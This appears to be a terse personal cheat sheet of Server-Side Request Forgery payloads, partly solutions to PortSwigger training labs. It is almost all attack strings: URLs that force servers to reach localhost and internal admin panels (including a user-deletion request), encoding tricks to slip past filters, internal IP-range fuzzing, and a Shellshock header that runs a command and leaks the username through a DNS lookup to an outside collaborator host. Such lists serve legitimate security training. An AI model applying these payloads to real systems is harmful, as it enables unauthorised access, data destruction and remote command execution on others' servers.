# Server-Side Request Forgery - SSRF
> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## SSRF Blind
Change every param to: http://subdomain.burpcollaborator.net

## SSRF Reflected
-http://
-http://$domain - http://subdomain.$domain
-http://192.168
-http://127

## PORTSWIGGER
1)search stockApi=http://localhost/admin/delete?username=carlos
2)http://192.168.§0§.§1§:8080/admin
3)http://127.0.0.1/ - http://127.1/ - http://127.1/admin - http://127.1/%2561dmin
4)http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
5)/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
6)User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net + Referrer: http://192.168.§0§.§1§:8080,443,80
